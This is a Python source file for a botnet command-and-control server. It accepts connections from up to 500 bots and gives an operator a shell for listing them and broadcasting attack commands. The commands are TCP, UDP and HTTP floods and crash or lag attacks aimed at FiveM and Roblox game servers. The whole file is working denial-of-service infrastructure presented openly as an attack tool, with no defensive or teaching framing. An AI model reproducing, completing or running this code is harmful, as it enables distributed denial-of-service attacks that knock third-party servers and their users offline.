import socket
import threading
import time
import json

HOST ="0.0.0.0"
PORT = 1337  # Low-key port
bots = {}
MAX_BOTS = 500

def broadcast_command(command):
    for bot_id, bot_socket in list(bots.items()):
        try:
            bot_socket.send(command.encode())
            print(f"Sent {command} to {bot_id}")
        except:
            print(f"{bot_id} went dark")
            del bots[bot_id]

def handle_bot(bot_socket, bot_addr):
    bot_id = f"{bot_addr[0]}:{bot_addr[1]}"
    if len(bots) >= MAX_BOTS:
        bot_socket.close()
        return
    bots[bot_id] = bot_socket
    print(f"Bot {bot_id} enlisted. Total: {len(bots)}")
    
    while True:
        try:
            data = bot_socket.recv(1024).decode()
            if not data:
                break
            print(f"{bot_id}: {data}")
        except:
            print(f"Bot {bot_id} offline")
            del bots[bot_id]
            bot_socket.close()
            break

def start_server():
    server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    server.bind((HOST, PORT))
    server.listen(MAX_BOTS + 10)
    print(f"C2 Server active on {HOST}:{PORT}")
    
    threading.Thread(target=command_shell).start()
    
    while True:
        bot_socket, bot_addr = server.accept()
        bot_thread = threading.Thread(target=handle_bot, args=(bot_socket, bot_addr))
        bot_thread.start()

def command_shell():
    while True:
        cmd = input("C2 > ").strip()
        if cmd =="list":
            print(f"Bots online: {len(bots)} - {list(bots.keys())}")
        elif cmd.startswith("tcpflood"):
            target, port = cmd.split()[1], int(cmd.split()[2])
            broadcast_command(f"tcpflood {target} {port}")
        elif cmd.startswith("udpflood"):
            target, port = cmd.split()[1], int(cmd.split()[2])
            broadcast_command(f"udpflood {target} {port}")
        elif cmd.startswith("httpflood"):
            target = cmd.split()[1]
            broadcast_command(f"httpflood {target}")
        elif cmd.startswith("fivemcrash"):
            target = cmd.split()[1]
            broadcast_command(f"fivemcrash {target}")
        elif cmd.startswith("robloxlag"):
            target = cmd.split()[1]
            broadcast_command(f"robloxlag {target}")
        elif cmd =="killall":
            broadcast_command("kill")
            break
        else:
            print("Commands: list, tcpflood <ip> <port>, udpflood <ip> <port>, httpflood <url>, fivemcrash <ip>, robloxlag <ip>, killall")

if __name__ == "__main__":
    start_server()
